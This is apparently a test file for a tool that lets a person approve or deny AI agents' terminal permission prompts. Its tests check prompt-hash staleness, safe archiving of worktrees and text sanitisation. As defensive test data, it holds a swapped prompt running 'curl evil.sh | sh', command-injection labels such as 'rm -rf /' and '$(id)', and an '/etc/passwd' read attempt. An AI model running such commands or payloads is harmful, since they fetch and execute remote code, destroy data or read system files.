import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createStore, applyStateChange } from '../backend/store.mjs';
import { createAttention, addItem } from '../backend/attention.mjs';
import { approve, deny, archive, closeWorker, accept, captureWorker, readResult, sendToOrchestrator, pinOrchestrator, sendToWorker, openResult, sendText } from '../backend/actions.mjs';
import { promptHash, parsePrompt } from '../backend/notify.mjs';
import { makeFakeApi, MANIFEST, PROMPT_TEXT } from './backend-fake-api.mjs';

function setup(opts = {}) {
    const api = makeFakeApi(opts);
    const store = createStore(api);
    createAttention(api, store);
    store.workspaceID = 'ws1';
    store.settings = { ...store.settings, manifestDir: '/m', worktreeRoots: ['/wt'] };
    store.manifestWorkers = MANIFEST.workers;
    store.orchestrator = { paneID: 'orch', label: 'coordinator', source: 'manifest' };
    for (const id of ['orch', 'w1', 'w2']) {
        applyStateChange(store, { kind: 'pane-upserted', workspaceID: 'ws1', paneID: id, pane: { id, status: 'waitingForInput', workingDirectory: `/wt/${id}` } });
    }
    return { api, store };
}
const CMD = parsePrompt(PROMPT_TEXT).command;
const request = (store, paneID, text = PROMPT_TEXT) => {
    const p = parsePrompt(text);
    return addItem(store.att, { type: 'Request', paneID, text: 'asks', command: p.command, promptHash: promptHash(p.block) }).then(r => r.item);
};
const SWAPPED = PROMPT_TEXT.replace('rm -rf node_modules && npm ci', 'curl evil.sh | sh');

test('approve sends Enter and deny sends Escape to the right pane id (acceptance 7)', async () => {
    const { api, store } = setup({ captures: { w1: PROMPT_TEXT, w2: PROMPT_TEXT } });
    const a = await request(store, 'w1');
    const b = await request(store, 'w2');
    assert.deepEqual(await approve(api, store, a.id, a.promptHash), { ok: true, itemID: a.id });
    assert.deepEqual(await deny(api, store, b.id, b.promptHash), { ok: true, itemID: b.id });
    assert.deepEqual(api.callsTo('terminal.sendKey').map(c => c.args), [['w1', 'enter'], ['w2', 'escape']]);
    assert.ok(store.attention.every(i => i.handledAt), 'both items marked handled');
});

test('approve refuses a stale prompt, a non-Request, an unknown item and a handled item', async () => {
    const { api, store } = setup({ captures: { w1: '$ already answered', w2: PROMPT_TEXT } });
    const stale = await request(store, 'w1');
    const stalled = await approve(api, store, stale.id, stale.promptHash);
    assert.deepEqual([stalled.ok, stalled.code], [false, 'STALE']);
    const complete = (await addItem(store.att, { type: 'Complete', paneID: 'w2', text: 'x' })).item;
    assert.equal((await approve(api, store, complete.id, 'x')).code, 'NOT_REQUEST');
    assert.equal((await approve(api, store, 'nope', 'x')).code, 'NOT_FOUND');
    const good = await request(store, 'w2');
    await approve(api, store, good.id, good.promptHash);
    assert.equal((await approve(api, store, good.id, good.promptHash)).code, 'HANDLED');
    assert.equal(api.callsTo('terminal.sendKey').length, 1, 'no key was sent for the refused cases');
});

test('approve refuses when the prompt was swapped between display and click, and sends nothing', async () => {
    const { api, store } = setup({ captures: { w1: SWAPPED } });
    const item = await request(store, 'w1');
    const result = await approve(api, store, item.id, item.promptHash);
    assert.deepEqual([result.ok, result.code], [false, 'STALE']);
    assert.equal(api.callsTo('terminal.sendKey').length, 0);
    assert.equal(store.attention.find(i => i.id === item.id).handledAt, undefined, 'item stays open');
});

test('approve refuses a hash the view sent that differs from the stored item, or no hash at all', async () => {
    const { api, store } = setup({ captures: { w1: PROMPT_TEXT } });
    const item = await request(store, 'w1');
    assert.equal((await approve(api, store, item.id, promptHash('something else'))).code, 'STALE');
    assert.equal((await approve(api, store, item.id)).code, 'BAD_ARGS');
    assert.equal((await approve(api, store, item.id, '')).code, 'BAD_ARGS');
    const legacy = (await addItem(store.att, { type: 'Request', paneID: 'w2', text: 'old', command: CMD })).item;
    assert.equal((await approve({ ...api, terminal: api.terminal }, store, legacy.id, promptHash(CMD))).code, 'STALE', 'item without a stored hash');
    assert.equal(api.callsTo('terminal.sendKey').length, 0);
});

test('changing any single line of the raw prompt block changes the hash and approve is refused', async () => {
    const changed = PROMPT_TEXT.replace("Yes, and don't ask again for rm commands", 'Yes, and allow everything');
    assert.equal(parsePrompt(PROMPT_TEXT).command, parsePrompt(changed).command, 'command text alone is identical');
    assert.notEqual(promptHash(parsePrompt(PROMPT_TEXT).block), promptHash(parsePrompt(changed).block));
    const { api, store } = setup({ captures: { w1: changed } });
    const item = await request(store, 'w1', PROMPT_TEXT);
    assert.equal((await approve(api, store, item.id, item.promptHash)).code, 'STALE');
    assert.equal(api.callsTo('terminal.sendKey').length, 0);
});

test('approve works while Kelpi still says "running", because the live prompt still matches', async () => {
    const { api, store } = setup({ captures: { w1: PROMPT_TEXT } });
    const item = await request(store, 'w1');
    applyStateChange(store, { kind: 'pane-upserted', workspaceID: 'ws1', paneID: 'w1', pane: { id: 'w1', status: 'running' } });
    assert.equal((await approve(api, store, item.id, item.promptHash)).ok, true);
    assert.deepEqual(api.callsTo('terminal.sendKey').map(c => c.args), [['w1', 'enter']]);
});

test('approve sends exactly one Enter to the right pane when everything matches', async () => {
    const { api, store } = setup({ captures: { w1: PROMPT_TEXT, w2: PROMPT_TEXT } });
    const item = await request(store, 'w2');
    await approve(api, store, item.id, item.promptHash);
    assert.deepEqual(api.callsTo('terminal.sendKey').map(c => c.args), [['w2', 'enter']]);
});

test('deny of a swapped prompt still works (a prompt is present) and sends Escape only', async () => {
    const { api, store } = setup({ captures: { w1: SWAPPED } });
    const item = await request(store, 'w1');
    assert.equal((await deny(api, store, item.id)).ok, true);
    assert.deepEqual(api.callsTo('terminal.sendKey').map(c => c.args), [['w1', 'escape']]);
    const gone = setup({ captures: { w1: '$ nothing' } });
    const other = await request(gone.store, 'w1');
    assert.equal((await deny(gone.api, gone.store, other.id)).code, 'STALE');
});

test('promptHash normalises whitespace and is a sha256 hex string', () => {
    assert.match(promptHash(CMD), /^[0-9a-f]{64}$/);
    assert.equal(promptHash('  rm   -rf\tx '), promptHash('rm -rf x'));
    assert.notEqual(promptHash('rm -rf x'), promptHash('rm -rf y'));
});

test('archive refuses a dirty worktree and says so (acceptance 4)', async () => {
    const { api, store } = setup({ gitStatus: { '/wt/w1': { kind: 'dirty', changedFiles: 3, additions: 4, deletions: 1 } } });
    const result = await archive(api, store, 'w1');
    assert.deepEqual([result.ok, result.code], [false, 'DIRTY']);
    assert.match(result.error, /uncommitted changes/);
    assert.equal(store.archived.has('w1'), false);
});

test('archive refuses when git status is unknown, whether reported or thrown (acceptance 4)', async () => {
    const reported = setup({ gitStatus: { '/wt/w1': { kind: 'unknown' } } });
    const r1 = await archive(reported.api, reported.store, 'w1');
    assert.deepEqual([r1.ok, r1.code], [false, 'UNKNOWN_GIT']);
    assert.match(r1.error, /unknown/);
    const thrown = setup({ gitStatus: { '/wt/w1': new Error('git unavailable') } });
    assert.equal((await archive(thrown.api, thrown.store, 'w1')).code, 'UNKNOWN_GIT');
    const missing = setup({ gitStatus: {} });
    assert.equal((await archive(missing.api, missing.store, 'w1')).code, 'UNKNOWN_GIT');
    assert.equal(reported.store.archived.size + thrown.store.archived.size + missing.store.archived.size, 0);
});

test('archive of a clean worker marks it archived and never deletes or closes anything', async () => {
    const { api, store } = setup({ gitStatus: { '/wt/w1': { kind: 'clean' } } });
    await addItem(store.att, { type: 'Complete', paneID: 'w1', text: 'done' });
    assert.deepEqual(await archive(api, store, 'w1'), { ok: true, paneID: 'w1' });
    assert.ok(store.archived.has('w1'));
    assert.ok(store.attention.every(i => i.handledAt), 'its attention items are cleared');
    assert.deepEqual(api.destructive, []);
    // only the manifest's own worktree path was ever asked about
    assert.deepEqual(api.callsTo('services.call').map(c => c.args[2].repoPath), ['/wt/w1']);
    assert.equal(api.callsTo('panes.moveToWorkspace').length, 0);
    assert.equal(api.calls.some(c => /close|remove|delete/i.test(c.name)), false);
});

test('archive refuses a pane that is not a manifest worker, and a worker without a worktree skips git', async () => {
    const { api, store } = setup();
    assert.equal((await archive(api, store, 'stranger')).code, 'NOT_WORKER');
    assert.equal((await archive(api, store, 'orch')).code, 'NOT_WORKER');
    assert.deepEqual(await archive(api, store, 'w2'), { ok: true, paneID: 'w2' });
    assert.equal(api.callsTo('services.call').length, 0);
});

test('close-worker archives a clean worker and closes only that pane', async () => {
    const { api, store } = setup({ allowClose: true, gitStatus: { '/wt/w1': { kind: 'clean' } } });
    assert.deepEqual(await closeWorker(api, store, 'w1'), { ok: true, paneID: 'w1' });
    assert.ok(store.archived.has('w1'));
    assert.deepEqual(api.callsTo('panes.close').map(c => c.args), [['w1']]);
});

test('close-worker refuses a dirty worktree, the orchestrator and strangers, closing nothing', async () => {
    const dirty = setup({ allowClose: true, gitStatus: { '/wt/w1': { kind: 'dirty', changedFiles: 2 } } });
    assert.equal((await closeWorker(dirty.api, dirty.store, 'w1')).code, 'DIRTY');
    assert.equal((await closeWorker(dirty.api, dirty.store, 'orch')).code, 'NOT_WORKER');
    assert.equal((await closeWorker(dirty.api, dirty.store, 'stranger')).code, 'NOT_WORKER');
    assert.equal(dirty.api.callsTo('panes.close').length, 0);
    assert.equal(dirty.store.archived.has('w1'), false);
});

test('close-worker un-archives when the host refuses to close', async () => {
    const { api, store } = setup({ allowClose: true, closeFails: true });
    const result = await closeWorker(api, store, 'w2');
    assert.deepEqual([result.ok, result.code], [false, 'CLOSE_FAILED']);
    assert.equal(store.archived.has('w2'), false);
});

test('accept marks reviewed and messages the orchestrator, never calling a destructive API (acceptance 6)', async () => {
    const { api, store } = setup({ files: { '/wt/w1/result.md': '# Done' } });
    store.resultExists.set('w1', true);
    await addItem(store.att, { type: 'Complete', paneID: 'w1', text: 'finished' });
    const result = await accept(api, store, 'w1');
    assert.deepEqual(result, { ok: true, paneID: 'w1', notified: true });
    assert.ok(store.accepted.has('w1'));
    assert.ok(store.attention.every(i => i.handledAt));
    const sent = api.callsTo('terminal.send');
    assert.equal(sent.length, 1);
    assert.equal(sent[0].args[0], 'orch');
    assert.match(sent[0].args[1], /accepted/);
    assert.match(sent[0].args[1], /Nothing was merged/);
    assert.deepEqual(api.destructive, []);
    assert.deepEqual([...new Set(api.calls.map(c => c.name).filter(n => n !== 'storage.set'))].sort(), ['terminal.send']);
});

test('accept refuses an unfinished worker and a non-worker', async () => {
    const { api, store } = setup();
    applyStateChange(store, { kind: 'pane-upserted', workspaceID: 'ws1', paneID: 'w1', pane: { id: 'w1', status: 'running' } });
    assert.equal((await accept(api, store, 'w1')).code, 'NOT_FINISHED');
    assert.equal((await accept(api, store, 'stranger')).code, 'NOT_WORKER');
    assert.equal(store.accepted.size, 0);
    assert.equal(api.callsTo('terminal.send').length, 0);
});

test('sendText rejects control characters and over-long text (BAD_TEXT) and sends nothing', async () => {
    const { api } = setup();
    for (const bad of ['a\u001bb', 'a\rb', 'a\u0000b', 'a\tb', 'a\bb', 'x'.repeat(4001), 'trailing newline\n'])
        assert.equal((await sendText(api, 'orch', bad)).code, 'BAD_TEXT', JSON.stringify(bad.slice(0, 20)));
    assert.equal(api.callsTo('terminal.send').length, 0);
    assert.equal((await sendText(api, 'orch', 'line one\nline two')).ok, true);
});

test('accept with a hostile label sends nothing and does not mark accepted', async () => {
    for (const label of ['evil\nrm -rf /', 'a`id`', 'a$(id)b', 'a\u001b[2Jb', 'x'.repeat(41), '']) {
        const { api, store } = setup();
        store.manifestWorkers = [{ ...MANIFEST.workers[0], label }, MANIFEST.workers[1]];
        store.resultExists.set('w1', true);
        const result = await accept(api, store, 'w1');
        assert.deepEqual([result.ok, result.code], [false, 'BAD_LABEL'], JSON.stringify(label));
        assert.equal(api.callsTo('terminal.send').length, 0);
        assert.equal(store.accepted.has('w1'), false);
    }
});

test('sendToOrchestrator fails cleanly with no orchestrator; accept still records the review', async () => {
    const { api, store } = setup();
    store.orchestrator = null;
    store.resultExists.set('w1', true);
    assert.equal((await sendToOrchestrator(api, store, 'hi')).code, 'NO_ORCHESTRATOR');
    assert.deepEqual(await accept(api, store, 'w1'), { ok: true, paneID: 'w1', notified: false });
});

test('captureWorker returns text, defaults to 60 lines, and reports failures', async () => {
    const { api, store } = setup({ captures: { w1: 'hello' } });
    assert.deepEqual(await captureWorker(api, store, 'w1'), { ok: true, text: 'hello' });
    assert.equal(api.callsTo('terminal.capture')[0].args[1].lines, 60);
    assert.equal((await captureWorker(api, store, '')).code, 'BAD_ARGS');
    const broken = setup({ captures: {} });
    assert.equal((await captureWorker(broken.api, broken.store, 'w1', 5)).code, 'CAPTURE_FAILED');
});

test('captureWorker refuses any pane that is not a manifest worker and never captures it', async () => {
    const { api, store } = setup({ captures: { w1: 'hello', stranger: 'secret', orch: 'o' } });
    for (const id of ['stranger', 'orch', 'nope']) assert.equal((await captureWorker(api, store, id)).code, 'NOT_WORKER', id);
    assert.equal(api.callsTo('terminal.capture').length, 0);
});

test('sendToWorker sends to a manifest worker only, with validated text', async () => {
    const { api, store } = setup({ captures: { w1: ['─'.repeat(40), '❯ ', '─'.repeat(40)].join('\n') } });
    assert.deepEqual(await sendToWorker(api, store, 'w1', 'please add tests\nthanks'), { ok: true, paneID: 'w1' });
    assert.deepEqual(api.callsTo('terminal.send').map(c => c.args), [['w1', 'please add tests\nthanks']]);
    for (const id of ['stranger', 'orch', 'nope']) assert.equal((await sendToWorker(api, store, id, 'hi')).code, 'NOT_WORKER', id);
    assert.equal((await sendToWorker(api, store, 'w1', '')).code, 'BAD_ARGS');
    assert.equal((await sendToWorker(api, store, 'w1', 5)).code, 'BAD_ARGS');
    assert.equal((await sendToWorker(api, store, 'w1', 'x'.repeat(4001))).code, 'BAD_TEXT');
    assert.equal((await sendToWorker(api, store, 'w1', 'x'.repeat(4000))).ok, true);
    for (const bad of ['a\u001b[31mb', 'a\rb', 'a\u0000b', 'a\tb', 'a\u007fb', 'a\bb']) assert.equal((await sendToWorker(api, store, 'w1', bad)).code, 'BAD_TEXT', JSON.stringify(bad));
    assert.equal(api.callsTo('terminal.send').length, 2, 'only the two valid sends went out');
});

test('openResult opens only the manifest resultPath of a worker', async () => {
    const { api, store } = setup({ files: { '/wt/w1/result.md': '# Goal\nx' } });
    assert.deepEqual(await openResult(api, store, 'w1'), { ok: true, path: '/wt/w1/result.md' });
    assert.deepEqual(api.callsTo('files.open').map(c => c.args[0]), ['/wt/w1/result.md']);
    assert.equal((await openResult(api, store, 'w2')).code, 'NO_RESULT');
    for (const id of ['stranger', 'orch', 'nope']) assert.equal((await openResult(api, store, id)).code, 'NOT_WORKER', id);
    assert.equal(api.callsTo('files.open').length, 1);
});

test('readResult reads only the worker resultPath, never an unlisted path', async () => {
    const { api, store } = setup({ files: { '/wt/w1/result.md': '# ok', '/etc/passwd': 'root:x' } });
    await readResult(api, store, 'w1');
    for (const id of ['stranger', 'orch', '/etc/passwd']) assert.equal((await readResult(api, store, id)).code, 'NOT_WORKER', id);
    assert.deepEqual(api.callsTo('files.read').map(c => c.args[0]), ['/wt/w1/result.md']);
});

test('readResult returns the text and Goal, Done, Next summary; NO_RESULT when absent (acceptance 5)', async () => {
    const md = '# Result\n\n## Goal\nFix the lag\n\n## Done\n- found it\n- fixed it\n\n## Next\nReview\n';
    const { api, store } = setup({ files: { '/wt/w1/result.md': md } });
    const result = await readResult(api, store, 'w1');
    assert.deepEqual(result.summary, { goal: 'Fix the lag', done: '- found it\n- fixed it', next: 'Review' });
    assert.equal(result.path, '/wt/w1/result.md');
    assert.equal((await readResult(api, store, 'w2')).code, 'NO_RESULT');
    store.manifestWorkers = [{ ...MANIFEST.workers[0], resultPath: '/wt/w1/missing.md' }];
    assert.equal((await readResult(api, store, 'w1')).code, 'NO_RESULT');
    assert.equal((await readResult(api, store, 'stranger')).code, 'NOT_WORKER');
    const bold = setup({ files: { '/wt/w1/result.md': '**Goal**\nA\n**Done**\nB\n' } });
    assert.deepEqual((await readResult(bold.api, bold.store, 'w1')).summary, { goal: 'A', done: 'B', next: '' });
});

test('pinOrchestrator pins a known non-worker pane only', async () => {
    const { api, store } = setup();
    applyStateChange(store, { kind: 'pane-upserted', workspaceID: 'ws1', paneID: 'stranger', pane: { id: 'stranger', status: 'idle' } });
    assert.equal((await pinOrchestrator(api, store, 'ghost')).code, 'NO_PANE');
    assert.equal((await pinOrchestrator(api, store, 'w1')).code, 'IS_WORKER');
    assert.deepEqual(await pinOrchestrator(api, store, 'stranger'), { ok: true });
    assert.equal(store.pinnedOrchestratorPaneID, 'stranger');
    assert.equal(api.storageMap.get('pins').orchestratorPaneID, 'stranger');
});
